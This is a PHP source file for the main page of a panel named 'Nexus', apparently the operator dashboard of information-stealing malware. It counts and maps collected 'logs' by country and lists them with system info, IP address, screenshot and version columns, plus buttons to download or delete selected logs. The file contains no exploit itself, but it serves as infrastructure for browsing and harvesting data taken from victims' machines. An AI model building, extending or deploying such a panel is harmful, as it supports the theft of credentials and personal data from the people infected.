<?php
session_start();
if(!file_exists("database.php"))
    header("Location: install.php", true, 301);
else
    if(file_exists("install.php"))
        unlink("install.php");
include 'database.php';
require_once("auth.php");
$logsTotal = $pdoConnection->query("SELECT COUNT(1) FROM `logs`")->fetchColumn();
$logs24 = $pdoConnection->query("SELECT COUNT(*) FROM `logs` WHERE `date`> UNIX_TIMESTAMP(NOW() - INTERVAL 1 DAY)")->fetchColumn();;
$logsweek = $pdoConnection->query("SELECT COUNT(*) FROM `logs` WHERE `date`> UNIX_TIMESTAMP(NOW() - INTERVAL 7 DAY)")->fetchColumn();;
   ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <script src="js/jquery.js"></script>
	  	  <script src="js/datatables.min.js"></script>

  <title>Nexus</title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
  <link rel="shortcut icon" href="images/favicon.png" />
  <link rel="stylesheet" href="css/maps/jquery-jvectormap-2.0.3.css" type="text/css" media="screen"/>
  <link id="style" rel="stylesheet" href="css/<?php if($_COOKIE["nightmode"]=="true") echo "dark";?>style.css">
  <link rel="stylesheet" href="css/viewbox.css">
	<link rel="stylesheet" href="css/switch.css">
</head>

<body onload="drawTable()">
  <div class="container-scroller">
    <?php include "partials/_navbar.php";?>
    <div class="container-fluid page-body-wrapper">
      <div class="main-panel">
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin">
              <div class="card card-statistics">
                <div class="card-body p-0">
                  <div class="row">
                    <div class="col-md-6 col-lg-4">
                      <div class="d-flex justify-content-between border-right card-statistics-item">
                        <div>
                          <h1><?php echo $logsTotal;?></h1>
                          <p class="text-muted mb-0">Total logs</p>
                        </div>
                        <i class="fas icon-large text-primary fa-calendar-alt"></i>
                      </div>
                    </div>
                    <div class="col-md-6 col-lg-4">
                      <div class="d-flex justify-content-between border-right card-statistics-item">
                        <div>
                          <h1><?php echo $logs24;?></h1>
                          <p class="text-muted mb-0">24h. logs</p>
                        </div>
                        <i class="fas icon-large text-primary fa-calendar-day"></i>
                      </div>
                    </div>
                    <div class="col-md-6 col-lg-4">
                      <div class="d-flex justify-content-between border-right card-statistics-item">
                        <div>
                          <h1><?php echo $logsweek;?></h1>
                          <p class="text-muted mb-0">Week logs</p>
                        </div>
                        <i class="fas icon-large text-primary fa-calendar-week"></i>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-12 grid-margin">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Country statistics</h4>
				  <script>
				  var countryData = {
					  <?php
					  $infoAll = $pdoConnection->query("SELECT country,count(*) FROM `logs` WHERE 1 GROUP BY country");
					  $currentArray = array();
					  $i=0;
					  while($info = $infoAll->fetch()){
						  $currentArray[$i]='"'.$info[0].'":'.$info[1];
						  $i++;
					  }
					  echo implode(",",$currentArray);
					  ?>
				  };
				  </script>
                  <div id="vmap" class="vector-map demo-vector-map"></div>
                </div>
              </div>
            </div>
          
		  <div class = "col-12 grid-margin">
		  <div class="card">
            <div class="card-body">
                <div class="col-12 table">
								  <div style = "padding-bottom: 1rem;">
						<center>
						<a id="chkbxdown" href="#!" onclick="downloadSelected()" class="btn btn-info btn-sm">Download</a>
						<a id="chkbx" href="#!" onclick="deleteSelected()" class="btn btn-info btn-sm">Delete</a>
						</center>
					</div>
					
                  <table id="logs-listing" class="table">
                    <thead>
                      <tr>
					  				<th style="display:none;">ID</th>
                                    <th style="width: 25%;">Metadata</th>
                                    <th>SysInfo</th>
                                    <th>IP/Country</th>
                                    <th>Date/Time</th>
                                    <th>Ver</th>
                                    <th>Screenshot</th>
									<th>Commentary</th>
                                    <th>More</th>
                      </tr>
                    </thead>
                    <tbody></tbody>
                  </table>
				  </div>
              </div>
			  </div>
            </div>
          </div>
		   </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
    <script src="js/maps/jquery-jvectormap-2.0.3.min.js"></script>
  	<script src="js/maps/world-mill.js"></script>
  <!-- Custom js for this page-->
  <script src="js/maps/maps.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
      integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"
      crossorigin="anonymous"></script>
	     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
  <!-- End custom js for this page-->
  	<script defer src="js/main.js"></script>
</body>

</html>
